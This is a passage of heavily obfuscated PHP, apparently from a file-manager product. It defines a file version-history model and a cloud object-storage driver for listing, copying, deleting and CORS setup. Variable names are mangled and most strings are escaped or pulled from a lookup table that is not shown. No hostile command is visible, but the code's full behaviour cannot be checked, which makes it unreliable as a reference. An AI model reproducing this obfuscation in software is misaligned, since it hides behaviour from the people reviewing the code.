$ãÙõ£´¬[12]; } $·È¤ÒÕ[$ãÙõ£´¬[2068]] = $ù¤•Ô¾[$·È¤ÒÕ[$ãÙõ£´¬[1704]]]; } unset($·È¤ÒÕ); $™ºŸ™‚ [$ãÙõ£´¬[421]] = $–¢ù†îœ; return $™ºŸ™‚ ; } public function removeBySource($ÈÖ‡ûŞ) { $­¬Ìã° = array($_SERVER[ˆûùúÊ¯][467] => $ÈÖ‡ûŞ); $this->where($­¬Ìã°)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\162\x63\145\x5f\150\151\163\164\x6f\x72\171"; public function historyCount($”øâüñ–) { $²©Ø™ĞØ =& $_SERVER[ˆûùúÊ¯]; if (!$”øâüñ–) { return array(); } if (is_string($”øâüñ–) || is_int($”øâüñ–)) { $”øâüñ– = array($”øâüñ–); } $ú®ªÃ¸æ = array($²©Ø™ĞØ[190], $²©Ø™ĞØ[1929] => $²©Ø™ĞØ[541]); $¹´ğ“ÎÕ = array($²©Ø™ĞØ[190] => array($²©Ø™ĞØ[7], $”øâüñ–)); $‡åş÷ã° = $this->field($ú®ªÃ¸æ)->where($¹´ğ“ÎÕ)->group($²©Ø™ĞØ[190])->select(); return array_to_keyvalue($‡åş÷ã°, $²©Ø™ĞØ[190], $²©Ø™ĞØ[541]); } public function addHistory($´·×€•ò, $Åä†İ‘î = '') { $¦ÕÉˆšÌ =& $_SERVER[ˆûùúÊ¯]; $ó±íáÈ¢ = array($¦ÕÉˆšÌ[467] => $´·×€•ò[$¦ÕÉˆšÌ[190]], $¦ÕÉˆšÌ[1695] => isset($´·×€•ò[$¦ÕÉˆšÌ[505]]) ? $´·×€•ò[$¦ÕÉˆšÌ[505]] : $´·×€•ò[$¦ÕÉˆšÌ[503]], $¦ÕÉˆšÌ[518] => $´·×€•ò[$¦ÕÉˆšÌ[517]], $¦ÕÉˆšÌ[593] => $´·×€•ò[$¦ÕÉˆšÌ[86]], $¦ÕÉˆšÌ[2140] => $Åä†İ‘î); if ($GLOBALS[$¦ÕÉˆšÌ[6]][$¦ÕÉˆšÌ[99]][$¦ÕÉˆšÌ[1278]] >= 1) { $this->historyAutoClear($ó±íáÈ¢[$¦ÕÉˆšÌ[190]]); $this->add($ó±íáÈ¢); } Hook::trigger($¦ÕÉˆšÌ[2141], $ó±íáÈ¢); Model($¦ÕÉˆšÌ[2142])->eventFileEdit($´·×€•ò[$¦ÕÉˆšÌ[190]]); } private function historyAutoClear($ ĞŸÒì) { $€áÖÊÈ =& $_SERVER[ˆûùúÊ¯]; $ÔÀ¿µãÆ = Model($€áÖÊÈ[830])->get($€áÖÊÈ[1300]); $÷ÔùÂ„ = $GLOBALS[$€áÖÊÈ[6]][$€áÖÊÈ[99]][$€áÖÊÈ[1278]]; $êÔÛğù = $ÔÀ¿µãÆ == $€áÖÊÈ[1301] ? min(5, $÷ÔùÂ„) : $÷ÔùÂ„; $êÔÛğù = $êÔÛğù <= 0 ? 0 : $êÔÛğù - 1; if ($êÔÛğù >= 500) { return; } $ˆ­©ŒÎ‘ = array($€áÖÊÈ[467] => $ ĞŸÒì); $¼‰–ó‚ = $this->field($€áÖÊÈ[2143])->where($ˆ­©ŒÎ‘)->order($€áÖÊÈ[2137])->select(); if (!$¼‰–ó‚ || $êÔÛğù >= count($¼‰–ó‚)) { return; } $Ñæ“¸ú = array_to_keyvalue($¼‰–ó‚, $€áÖÊÈ[12], $€áÖÊÈ[451]); $Ñæ“¸ú = array_slice($Ñæ“¸ú, $êÔÛğù); $Öù¥Òñî = array_to_keyvalue($¼‰–ó‚, $€áÖÊÈ[12], $€áÖÊÈ[517]); $Öù¥Òñî = array_slice($Öù¥Òñî, $êÔÛğù); if (!$Ñæ“¸ú || !$Öù¥Òñî) { return; } $ˆ­©ŒÎ‘ = array($€áÖÊÈ[469] => array($€áÖÊÈ[7], $Ñæ“¸ú)); $this->where($ˆ­©ŒÎ‘)->delete(); Model($€áÖÊÈ[520])->remove($Öù¥Òñî); } public function listData($¶ºç³œ) { $µ™­óïÓ =& $_SERVER[ˆûùúÊ¯]; $‰ÂãËÀë = array($µ™­óïÓ[467] => $¶ºç³œ); $ƒÎé¾Ù¦ = $µ™­óïÓ[2144]; $É©‰‹ = $this->field($ƒÎé¾Ù¦)->where($‰ÂãËÀë)->order($µ™­óïÓ[2137])->selectPage(); $this->_listAppendUser($É©‰‹[$µ™­óïÓ[421]]); $«á›—¿Ø = Model($µ™­óïÓ[830])->get($µ™­óïÓ[1300]); $üïá‹ßã = 5; if ($«á›—¿Ø == $µ™­óïÓ[1301]) { $É©‰‹[$µ™­óïÓ[421]] = array_slice($É©‰‹[$µ™­óïÓ[421]], 0, $üïá‹ßã); $É©‰‹[$µ™­óïÓ[418]] = array($µ™­óïÓ[2145] => 1, $µ™­óïÓ[2146] => 20, $µ™­óïÓ[2147] => 1, $µ™­óïÓ[2148] => count($É©‰‹[$µ™­óïÓ[421]])); } return $É©‰‹; } protected function _listAppendUser(&$Ÿ®ñÇè„) { $‚ã·¨ =& $_SERVER[ˆûùúÊ¯]; $ÆÒöØíï = array_to_keyvalue($Ÿ®ñÇè„, $‚ã·¨[12], $‚ã·¨[1704]); $×¦ç¢ß÷ = Model($‚ã·¨[575])->userListInfo($ÆÒöØíï); foreach ($Ÿ®ñÇè„ as &$Ğ‰æ¬¯ö) { $¥‹ô¤• = $Ğ‰æ¬¯ö[$‚ã·¨[1704]]; $Ğ‰æ¬¯ö[$‚ã·¨[503]] = $×¦ç¢ß÷[$¥‹ô¤•] ? $×¦ç¢ß÷[$¥‹ô¤•] : !1; } unset($Ğ‰æ¬¯ö); } public function fileInfo($£ï¥) { $Ì™»½ªé =& $_SERVER[ˆûùúÊ¯]; $¹ØÎÉö = $this->tablePrefix; $¢è´‹ü‰ = "{$¹ØÎÉö}\151\x6f\137\146\x69\154\145\x20\x66\x69\154\145\163\40\157\x6e\x20\146\x69\154\x65\x73\56\x66\x69\154\145\111\x44\40\75\40\x68\151\163\164\x6f\x72\171\x2e\146\x69\154\145\111\x44"; return $this->alias($Ì™»½ªé[2149])->where(array($Ì™»½ªé[469] => $£ï¥))->join($¢è´‹ü‰, $Ì™»½ªé[2150])->find(); } public function removeItem($¢¾š™à) { $˜¬èÈã÷ =& $_SERVER[ˆûùúÊ¯]; $·ãÁ¹ìû = array($˜¬èÈã÷[469] => $¢¾š™à); $ˆ–—Îº = $this->where($·ãÁ¹ìû)->find(); if ($ˆ–—Îº) { $‘ƒòÏ‚ = $this->where($·ãÁ¹ìû)->delete(); Model($˜¬èÈã÷[520])->remove($ˆ–—Îº[$˜¬èÈã÷[517]]); return $‘ƒòÏ‚; } return !1; } public function removeBySource($°¬ì¿€) { $à„ÚŞÀ =& $_SERVER[ˆûùúÊ¯]; if (!$°¬ì¿€) { return !1; } if (!is_array($°¬ì¿€)) { $°¬ì¿€ = array($°¬ì¿€); } $´©Ü´– = array($à„ÚŞÀ[467] => array($à„ÚŞÀ[7], $°¬ì¿€)); $¥ôÔ¥à‹ = $this->field($à„ÚŞÀ[518])->where($´©Ü´–)->select(); if ($¥ôÔ¥à‹) { $this->where($´©Ü´–)->delete(); $ÆòşÊ‘² = array_to_keyvalue($¥ôÔ¥à‹, $à„ÚŞÀ[12], $à„ÚŞÀ[517]); Model($à„ÚŞÀ[520])->remove($ÆòşÊ‘²); } return !0; } public function setDetail($š«¤­¨, $İ‹†ïÆ) { $»›Â¨­ =& $_SERVER[ˆûùúÊ¯]; return $this->where(array($»›Â¨­[469] => $š«¤­¨))->save(array($»›Â¨­[2140] => $İ‹†ïÆ)); } public function rollbackToItem($ÙÊ§üºã, $È äø¶ñ) { $ö®˜œÍû =& $_SERVER[ˆûùúÊ¯]; $ø¯·™ñä = Model($ö®˜œÍû[885])->sourceInfo($ÙÊ§üºã); $this->addHistory($ø¯·™ñä, LNG($ö®˜œÍû[2151])); $¾ôÂ…¨¡ = $this->find($È äø¶ñ); $œŠØ‚ûâ = array($ö®˜œÍû[517] => $¾ôÂ…¨¡[$ö®˜œÍû[517]], $ö®˜œÍû[86] => $¾ôÂ…¨¡[$ö®˜œÍû[86]], $ö®˜œÍû[95] => time(), $ö®˜œÍû[505] => USER_ID); Model($ö®˜œÍû[885])->where(array($ö®˜œÍû[190] => $ÙÊ§üºã))->save($œŠØ‚ûâ); return $this->where(array($ö®˜œÍû[469] => $È äø¶ñ))->delete(); } public function clearSame($ÙƒÑÔê¼) { $§Š·²ß¯ =& $_SERVER[ˆûùúÊ¯]; $ï­ÜÌë¦ = $this->listData($ÙƒÑÔê¼); $­•ÈÎâ‰ = array_to_keyvalue_group($ï­ÜÌë¦, $§Š·²ß¯[517]); $Æ€òäÜ = array(); $¡ÍÁÉ£Ó = array(); foreach ($­•ÈÎâ‰ as $½³«¯•) { if (!$½³«¯• || count($½³«¯•) <= 1) { continue; } foreach ($½³«¯• as $¦òªÏ©) { $Æ€òäÜ[] = $¦òªÏ©[$§Š·²ß¯[517]]; $¡ÍÁÉ£Ó[] = $¦òªÏ©[$§Š·²ß¯[451]]; } } if (!$¡ÍÁÉ£Ó) { return; } $this->where(array($§Š·²ß¯[451] => array($§Š·²ß¯[7], $¡ÍÁÉ£Ó)))->delete(); Model($§Š·²ß¯[520])->remove($Æ€òäÜ); } public function userSpace() { $ùèô£ˆØ =& $_SERVER[ˆûùúÊ¯]; $”ôÇ¨Ä = $this->tablePrefix; $šï±Ù·¼ = array($ùèô£ˆØ[1695] => USER_ID); $­é—Šü¿ = "{$”ôÇ¨Ä}\x69\x6f\137\146\151\x6c\x65\x20\x66\151\154\145\x73\40\157\x6e\40\146\151\154\145\x73\56\146\x69\154\x65\x49\x44\40\x3d\x20\x68\151\163\x74\x6f\162\171\x2e\146\x69\154\x65\111\x44"; return $this->alias($ùèô£ˆØ[2149])->where($šï±Ù·¼)->join($­é—Šü¿, $ùèô£ˆØ[2150])->sum($ùèô£ˆØ[86]); } } goto BÌ½·ñÌ²É; CÕòˆ÷«ïÎ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($¾»ù¨„¸) { parent::__construct(); include_once SDK_DIR . $_SERVER[ˆûùúÊ¯][1427]; $this->_init($¾»ù¨„¸); } public function _init($ç•­Ïôó) { $ôÙ—æÖƒ =& $_SERVER[ˆûùúÊ¯]; $this->config = $ç•­Ïôó; foreach ($ç•­Ïôó as $Š‰µ©¸› => $æ¢şÃ€Ï) { if (isset($this->{$Š‰µ©¸›})) { $this->{$Š‰µ©¸›} = $æ¢şÃ€Ï; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ôÙ—æÖƒ[1428] . LNG($ôÙ—æÖƒ[1429])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $»¨ºëš‡ =& $_SERVER[ˆûùúÊ¯]; $äşè…‹Á = new OSS\Model\CorsConfig(); $Î€¯•Ğ = new OSS\Model\CorsRule(); $Î€¯•Ğ->addAllowedOrigin($»¨ºëš‡[1430]); $Î€¯•Ğ->addAllowedMethod($»¨ºëš‡[1431]); $Î€¯•Ğ->addAllowedMethod($»¨ºëš‡[1432]); $Î€¯•Ğ->addAllowedMethod($»¨ºëš‡[1433]); $Î€¯•Ğ->addAllowedMethod($»¨ºëš‡[1434]); $Î€¯•Ğ->addAllowedMethod($»¨ºëš‡[170]); $Î€¯•Ğ->setMaxAgeSeconds(600); $Î€¯•Ğ->addExposeHeader($»¨ºëš‡[1435]); $Î€¯•Ğ->addAllowedHeader($»¨ºëš‡[1430]); $äşè…‹Á->addRule($Î€¯•Ğ); try { $this->client->putBucketCors($this->bucket, $äşè…‹Á); } catch (OSS\Core\OssException $Ú¦Ïê¶¹) { return !1; } return !0; } public function getBucketCors() { $ƒ„á®Àá =& $_SERVER[ˆûùúÊ¯]; $êéâŠàÙ = null; try { $êéâŠàÙ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¦ÇÖà§¬) { return null; } if (!$êéâŠàÙ || !($¯ÇáÕùí = $êéâŠàÙ->getRules())) { return null; } $şºÀÛ°Æ = $¯ÇáÕùí[0]->getAllowedOrigins(); $Éı²²…è = $¯ÇáÕùí[0]->getAllowedMethods(); $×Õ Šá = $¯ÇáÕùí[0]->getMaxAgeSeconds(); $ñ±èë° = $¯ÇáÕùí[0]->getExposeHeaders(); $½„Û” = $¯ÇáÕùí[0]->getAllowedHeaders(); return array($ƒ„á®Àá[211] => isset($şºÀÛ°Æ[0]) ? $şºÀÛ°Æ[0] : $ƒ„á®Àá[12], $ƒ„á®Àá[215] => $Éı²²…è, $ƒ„á®Àá[1436] => $×Õ Šá, $ƒ„á®Àá[1437] => isset($ñ±èë°[0]) ? $ñ±èë°[0] : $ƒ„á®Àá[12], $ƒ„á®Àá[213] => isset($½„Û”[0]) ? $½„Û”[0] : $ƒ„á®Àá[12]); } public function isBucketCors() { $ò£Èáƒ =& $_SERVER[ˆûùúÊ¯]; $ß˜‹Õ¬Í = $this->getBucketCors(); if (!$ß˜‹Õ¬Í || !is_array($ß˜‹Õ¬Í)) { return !1; } if ($ß˜‹Õ¬Í[$ò£Èáƒ[211]] != $ò£Èáƒ[212] || $ß˜‹Õ¬Í[$ò£Èáƒ[213]] != $ò£Èáƒ[212]) { return !1; } $›€©·¥ì = array_map($ò£Èáƒ[214], $ß˜‹Õ¬Í[$ò£Èáƒ[215]]); if (!is_array($›€©·¥ì)) { $›€©·¥ì = array(); } $ß÷ÜÆüÏ = array($ò£Èáƒ[216], $ò£Èáƒ[217], $ò£Èáƒ[218], $ò£Èáƒ[219], $ò£Èáƒ[220]); $©úµìâ³ = array_diff($ß÷ÜÆüÏ, $›€©·¥ì); return empty($©úµìâ³); } public function mkfile($üñ’èÉÆ, $¤ÔÅ‹‡‹ = '', $êÊÀéÙ = REPEAT_RENAME) { $ÌŞÅÕœ = $this->setContent($üñ’èÉÆ, $¤ÔÅ‹‡‹); if ($ÌŞÅÕœ !== !1) { return $this->getPathOuter($üñ’èÉÆ); } return !1; } public function mkdir($¯ÏŒÛ µ, $ïÆ¥æ† = REPEAT_SKIP) { if ($ïÆ¥æ† && $this->_isFolder($¯ÏŒÛ µ)) { return $this->getPathOuter($¯ÏŒÛ µ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¯ÏŒÛ µ)); } catch (OSS\Core\OssException $‚€™İÔ) { return !1; } return $this->getPathOuter($¯ÏŒÛ µ); } private function fileList($ŒÒó‘±, $ŒÏÉÉ«Œ = '', $¥îƒÆˆÇ = 0) { $·ã—±‹Æ =& $_SERVER[ˆûùúÊ¯]; $ŒÒó‘± = trim($ŒÒó‘±, $·ã—±‹Æ[8]); $®Ç«â½ê = empty($ŒÒó‘±) && $ŒÒó‘± !== $·ã—±‹Æ[221] ? $·ã—±‹Æ[12] : $ŒÒó‘± . $·ã—±‹Æ[8]; $ñğ¿‚„¤ = $·ã—±‹Æ[12]; $·ãØ»’Î = 1000; $·ŒÔÍê = $ëÜıÏ±® = array(); while (!0) { check_abort(); $’¡ùïŒ¸ = array($·ã—±‹Æ[1438] => $ŒÏÉÉ«Œ, $·ã—±‹Æ[1439] => $®Ç«â½ê, $·ã—±‹Æ[1440] => $·ãØ»’Î, $·ã—±‹Æ[1441] => $ñğ¿‚„¤); try { $‚¢æšã = $this->client->listObjects($this->bucket, $’¡ùïŒ¸); } catch (OSS\Core\OssException $…ßİ´Æú) { break; } $ñğ¿‚„¤ = $‚¢æšã->getNextMarker(); $ªÈ×İûï = $‚¢æšã->getObjectList(); $™Œ‚æëŸ = $‚¢æšã->getPrefixList(); foreach ($ªÈ×İûï as $ÆÆ™Õßä) { if ($ÆÆ™Õßä->getKey() == $®Ç«â½ê) { continue; } $ÇšÁüÕ¢ = $ÆÆ™Õßä->getKey(); $ÌŞ”“¦ = $ÆÆ™Õßä->getSize(); $”Ë·îËÅ = $ÆÆ™Õßä->getLastModified(); $†şÁºæ½ = trim($ÆÆ™Õßä->getETag(), $·ã—±‹Æ[128]); $«»¸î¸ë = $¥îƒÆˆÇ ? array($·ã—±‹Æ[42] => $ÇšÁüÕ¢, $·ã—±‹Æ[86] => $ÌŞ”“¦, $·ã—±‹Æ[203] => strtotime($”Ë·îËÅ), $·ã—±‹Æ[1442] => $†şÁºæ½) : $ÇšÁüÕ¢; $×ÀŠ‘ë– = $ÌŞ”“¦ == 0 && substr($ÇšÁüÕ¢, strlen($ÇšÁüÕ¢) - 1, 1) == $·ã—±‹Æ[8] ? !0 : !1; $õÏÛô¥ = array($·ã—±‹Æ[86] => $ÌŞ”“¦, $·ã—±‹Æ[1443] => $ÌŞ”“¦, $·ã—±‹Æ[95] => strtotime($”Ë·îËÅ), $·ã—±‹Æ[1444] => $”Ë·îËÅ, $·ã—±‹Æ[1442] => $†şÁºæ½); $this->cacheMethodInfoSet($ÇšÁüÕ¢, $×ÀŠ‘ë–, $õÏÛô¥); if ($×ÀŠ‘ë–) { $·ŒÔÍê[] = $ÇšÁüÕ¢; continue; } $ëÜıÏ±®[] = $«»¸î¸ë; } foreach ($™Œ‚æëŸ as $÷¹ıæŒ) { $·ŒÔÍê[] = $÷¹ıæŒ->getPrefix(); $this->cacheMethodInfoSet($÷¹ıæŒ->getPrefix(), !0); } if ($ñğ¿‚„¤ === $·ã—±‹Æ[12]) { break; } } $this->cacheMethodInfoSet($ŒÒó‘±, !0); return array($·ã—±‹Æ[92] => $·ŒÔÍê, $·ã—±‹Æ[93] => $ëÜıÏ±®); } public function copyFile($Š¬Á“†, $ö×Ì¸®ˆ) { $©¡çèî = $this->size($Š¬Á“†); if ($©¡çèî < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Š¬Á“†, $this->bucket, $this->pathEncode($ö×Ì¸®ˆ)); } catch (OSS\Core\OssException $ƒ¹Ÿ²ßä) { return !1; } return $this->getPathOuter($ö×Ì¸®ˆ); } $¿öˆş† = $this->multiCopyObject($Š¬Á“†, $ö×Ì¸®ˆ, $©¡çèî); return $¿öˆş† ? $this->getPathOuter($ö×Ì¸®ˆ) : !1; } private function multiCopyObject($éşªÂÀï, $Ó‰®óµÁ, $¬«¿†Ô) { $ùÒÊöùÚ =& $_SERVER[ˆûùúÊ¯]; try { $‰ÆÆøª = array(); if ($èªšÇ® = $this->hashMd5($éşªÂÀï)) { $‰ÆÆøª = array(OSS\OssClient::OSS_HEADERS => array($ùÒÊöùÚ[1445] => $èªšÇ®)); } $ŸÀõâ¡ó = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ó‰®óµÁ), $‰ÆÆøª); $ï¿‚üÚ = 1; $ªÙã±Ç¢ = 0; $ìÈ¥’¿ = array(); $Âã•­ŠË = 1024 * 1024 * 10; $°™£üôÇ = $this->client->generateMultiuploadParts($¬«¿†Ô, $Âã•­ŠË); foreach ($°™£üôÇ as $ÆµŸóµ‚ => $ÉìÑ‡™å) { $Øî¾ÙÚ¼ = $ªÙã±Ç¢ + (int) $ÉìÑ‡™å[$ùÒÊöùÚ[1446]]; $ş“Ã“½¿ = (int) $ÉìÑ‡™å[$ùÒÊöùÚ[389]] + $Øî¾ÙÚ¼ - 1; $‰»¶‘ = array($ùÒÊöùÚ[1447] => $Øî¾ÙÚ¼, $ùÒÊöùÚ[1448] => $ş“Ã“½¿); $ìÈ¥’¿[] = $this->client->uploadPartCopy($this->bucket, $éşªÂÀï, $this->bucket, $this->pathEncode($Ó‰®óµÁ), $ï¿‚üÚ, $ŸÀõâ¡ó, $‰»¶‘); $ï¿‚üÚ = $ï¿‚üÚ + 1; } $¯¸ãğ‰Ô = array(); foreach ($ìÈ¥’¿ as $ÆµŸóµ‚ => $©Úå÷‹ˆ) { $¯¸ãğ‰Ô[] = array($ùÒÊöùÚ[1449] => $ÆµŸóµ‚ + 1, $ùÒÊöùÚ[1450] => $©Úå÷‹ˆ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ó‰®óµÁ), $ŸÀõâ¡ó, $¯¸ãğ‰Ô); } catch (OSS\Core\OssException $‘Üõ·ç) { return !1; } return !0; } public function moveFile($ÛÃÊ¡¨ã, $ÚùÍšò) { if ($this->copyFile($ÛÃÊ¡¨ã, $ÚùÍšò)) { $this->remove($ÛÃÊ¡¨ã); return $this->getPathOuter($ÚùÍšò); } return !1; } public function delFile($Õ¤¤û‹¾) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Õ¤¤û‹¾)); } catch (OSS\Core\OssException $¤ÛÓˆ²ä) { return !1; } return !0; } public function delFolder($•‰¥àäÜ) { $¥Î„ªîƒ =& $_SERVER[ˆûùúÊ¯]; if (!$this->exist($•‰¥àäÜ)) { return !0; } $this->listItemCache = !1; $âÇáÙ«Ñ = $this->fileList($•‰¥àäÜ); $this->listItemCache = !0; $Øô—ÀÒî = trim($•‰¥àäÜ, $¥Î„ªîƒ[8]) . $¥Î„ªîƒ[8]; if (!empty($•‰¥àäÜ) && $•‰¥àäÜ !== $¥Î„ªîƒ[221] && !in_array($Øô—ÀÒî, $âÇáÙ«Ñ[$¥Î„ªîƒ[92]])) { $âÇáÙ«Ñ[$¥Î„ªîƒ[92]][] = $Øô—ÀÒî; } $Ûå¼ù¹‘ = $this->delByBatch($âÇáÙ«Ñ[$¥Î„ªîƒ[93]]); if (!$Ûå¼ù¹‘) { return !1; } $Ûå¼ù¹‘ = $this->delByBatch($âÇáÙ«Ñ[$¥Î„ªîƒ[92]]); if (!$Ûå¼ù¹‘) { return !1; } return $this->delFile($Øô—ÀÒî); } private function delByBatch($»íô÷®—) { foreach (array_chunk($»íô÷®—, 1000) as $ÎùÊŒèõ) { try { $this->client->deleteObjects($this->bucket, $ÎùÊŒèõ); } catch (OSS\Core\OssException $¡Ğëş›í) { return !1; } } return !0; } public function rename($ºÆãñã, $¨ĞÀı»°) { return $this->renameObject($ºÆãñã, $¨ĞÀı»°); } private function fileInfo($æ³ŠŸ¿¼, $“±¥ìûí = false, $£Ã ‡Ù = array()) { $ÔôÓ‰¦º =& $_SERVER[ˆûùúÊ¯]; $£ª”Á¬‚ = array($ÔôÓ‰¦º[42] => $this->pathThis($æ³ŠŸ¿¼), $ÔôÓ‰¦º[94] => $this->getPathOuter($æ³ŠŸ¿¼), $ÔôÓ‰¦º[43] => $ÔôÓ‰¦º[223], $ÔôÓ‰¦º[86] => isset($£Ã ‡Ù[$ÔôÓ‰¦º[86]]) ? $£Ã ‡Ù[$ÔôÓ‰¦º[86]] : 0, $ÔôÓ‰¦º[184] => $this->ext($æ³ŠŸ¿¼)); if ($“±¥ìûí) { return $£ª”Á¬‚; } $£ª”Á¬‚[$ÔôÓ‰¦º[224]] = $£ª”Á¬‚[$ÔôÓ‰¦º[95]] = 0; $£ª”Á¬‚[$ÔôÓ‰¦º[225]] = $£ª”Á¬‚[$ÔôÓ‰¦º[226]] = !0; if (empty($£Ã ‡Ù)) { $­¢å–ÈÒ = $this->objectMeta($æ³ŠŸ¿¼); if (!$­¢å–ÈÒ) { return $£ª”Á¬‚; } $£Ã ‡Ù = array($ÔôÓ‰¦º[95] => strtotime($­¢å–ÈÒ[$ÔôÓ‰¦º[1444]]), $ÔôÓ‰¦º[86] => $­¢å–ÈÒ[$ÔôÓ‰¦º[1443]] + 0, $ÔôÓ‰¦º[1442] => $­¢å–ÈÒ[$ÔôÓ‰¦º[1442]]); } if (isset($£Ã ‡Ù[$ÔôÓ‰¦º[1442]]) && $£Ã ‡Ù[$ÔôÓ‰¦º[1442]]) { $£ª”Á¬‚[$ÔôÓ‰¦º[228]] = trim($£Ã ‡Ù[$ÔôÓ‰¦º[1442]], $ÔôÓ‰¦º[128]); } if (isset($£Ã ‡Ù[$ÔôÓ‰¦º[86]])) { $£ª”Á¬‚[$ÔôÓ‰¦º[86]] = $£Ã ‡Ù[$ÔôÓ‰¦º[86]]; } if (isset($£Ã ‡Ù[$ÔôÓ‰¦º[95]])) { $£ª”Á¬‚[$ÔôÓ‰¦º[95]] = $£Ã ‡Ù[$ÔôÓ‰¦º[95]]; } if (isset($£Ã ‡Ù[$ÔôÓ‰¦º[203]]) && !trim($£ª”Á¬‚[$ÔôÓ‰¦º[95]])) { $£ª”Á¬‚[$ÔôÓ‰¦º[95]] = $£Ã ‡Ù[$ÔôÓ‰¦º[203]]; } return $£ª”Á¬‚; } private function folderInfo($¶ÍÊİ²Ò, $“Ùäñò = false, $Û†ïù¦ = array()) { $‰ÓÓßºğ =& $_SERVER[ˆûùúÊ¯]; $Øğ¥—«è = array($‰ÓÓßºğ[42] => $this->pathThis($¶ÍÊİ²Ò), $‰ÓÓßºğ[94] => $this->getPathOuter($‰ÓÓßºğ[8] . $¶ÍÊİ²Ò), $‰ÓÓßºğ[43] => $‰ÓÓßºğ[85]); if ($“Ùäñò) { return $Øğ¥—«è; } $Øğ¥—«è[$‰ÓÓßºğ[224]] = $Øğ¥—«è[$‰ÓÓßºğ[95]] = 0; $Øğ¥—«è[$‰ÓÓßºğ[225]] = $Øğ¥—«è[$‰ÓÓßºğ[226]] = !0; if (empty($Û†ïù¦)) { $¶ÍÊİ²Ò = rtrim($¶ÍÊİ²Ò, $‰ÓÓßºğ[8]) . $‰ÓÓßºğ[8]; $ğ½ï›…Ë = $this->objectMeta($¶ÍÊİ²Ò); if (!$ğ½ï›…Ë) { return $Øğ¥—«è; } $Û†ïù¦ = array($‰ÓÓßºğ[224] => $ğ½ï›…Ë[$‰ÓÓßºğ[552]][$‰ÓÓßºğ[1451]], $‰ÓÓßºğ[95] => strtotime($ğ½ï›…Ë[$‰ÓÓßºğ[1444]])); } if (isset($Û†ïù¦[$‰ÓÓßºğ[95]])) { $Øğ¥—«è[$‰ÓÓßºğ[95]] = $Û†ïù¦[$‰ÓÓßºğ[95]]; } if (isset($Û†ïù¦[$‰ÓÓßºğ[224]])) { $Øğ¥—«è[$‰ÓÓßºğ[224]] = $Û†ïù¦[$‰ÓÓßºğ[224]]; } return $Øğ¥—«è; } public function listPath($ê…„ØØô, $¼—ˆ¾î© = false) { $åş®½Çû =& $_SERVER[ˆûùúÊ¯]; $¾Òš˜‘ü = $this->fileList($ê…„ØØô, $åş®½Çû[8], !0); foreach ($¾Òš˜‘ü[$åş®½Çû[92]] as $íºÆ»„´ => $¶ÇÁÏÂË) { $¾Òš˜‘ü[$åş®½Çû[92]][$íºÆ»„´] = $this->folderInfo($¶ÇÁÏÂË, $¼—ˆ¾î©, $¶ÇÁÏÂË); } foreach ($¾Òš˜‘ü[$åş®½Çû[93]] as $íºÆ»„´ => $¶ÇÁÏÂË) { $¾Òš˜‘ü[$åş®½Çû[93]][$íºÆ»„´] = $this->fileInfo($¶ÇÁÏÂË[$åş®½Çû[42]], $¼—ˆ¾î©, $¶ÇÁÏÂË); } return $¾Òš˜‘ü; } protected function infoChildren($š¿ËÒµ¨, &$¿ÜÂ—ê½) { $¨÷‡òÖ =& $_SERVER[ˆûùúÊ¯]; $‘É«í¥  = $this->fileList($š¿ËÒµ¨, $¨÷‡òÖ[12], !0); $¿ÜÂ—ê½[$¨÷‡òÖ[88]] += count($‘É«í¥ [$¨÷‡òÖ[92]]); $¿ÜÂ—ê½[$¨÷‡òÖ[87]] += count($‘É«í¥ [$¨÷‡òÖ[93]]); foreach ($‘É«í¥ [$¨÷‡òÖ[93]] as $Ü»È»ªñ) { if (!$Ü»È»ªñ || !$Ü»È»ªñ[$¨÷‡òÖ[86]]) { continue; } $¿ÜÂ—ê½[$¨÷‡òÖ[86]] += $Ü»È»ªñ[$¨÷‡òÖ[86]]; } } public function has($çÌš„Á’, $ñê§ó€Ë = false, $ıì¦Øıè = true) { $½õé¸å =& $_SERVER[ˆûùúÊ¯]; $çÌš„Á’ = trim($çÌš„Á’, $½õé¸å[8]); $¸å›æÍ® = empty($çÌš„Á’) && $çÌš„Á’ !== $½õé¸å[221] ? $½õé¸å[12] : $çÌš„Á’ . $½õé¸å[8]; $ªÓÖ§®¯ = $½õé¸å[12]; $ÖòÀØ÷» = 500; $çØÔ‰óğ = $¯à‡Í¥Œ = 0; while (!0) { check_abort(); $ÉÍ´û = array($½õé¸å[1438] => $½õé¸å[8], $½õé¸å[1439] => $¸å›æÍ®, $½õé¸å[1440] => $ÖòÀØ÷», $½õé¸å[1441] => $ªÓÖ§®¯); try { $Ú¨û¾¹£ = $this->client->listObjects($this->bucket, $ÉÍ´û); } catch (OSS\Core\OssException $ĞçêÂ²•) { break; } $ªÓÖ§®¯ = $Ú¨û¾¹£->getNextMarker(); $ó¬êµş = $Ú¨û¾¹£->getObjectList(); $ÍÈ€Ö²‘ = $Ú¨û¾¹£->getPrefixList(); if ($ñê§ó€Ë) { if (count($ó¬êµş) > 1 || count($ó¬êµş) == 1 && $ó¬êµş[0]->getKey() != $¸å›æÍ®) { $çØÔ‰óğ += count($ó¬êµş) - 1; } if (!empty($ÍÈ€Ö²‘)) { $¯à‡Í¥Œ += count($ÍÈ€Ö²‘); } if ($ªÓÖ§®¯ === $½õé¸å[12]) { break; } continue; } if ($ıì¦Øıè) { if (!empty($ó¬êµş)) { if (count($ó¬êµş) > 1 || $ó¬êµş[0]->getKey() != $¸å›æÍ®) { return !0; } } } else { if (!empty($ÍÈ€Ö²‘)) { return !0; } } if ($ªÓÖ§®¯ === $½õé¸å[12]) { break; } } if ($ñê§ó€Ë) { return array($½õé¸å[232] => $çØÔ‰óğ, $½õé¸å[233] => $¯à‡Í¥Œ); } return !1; } public function listAll($ëÂ…ü‡®) { 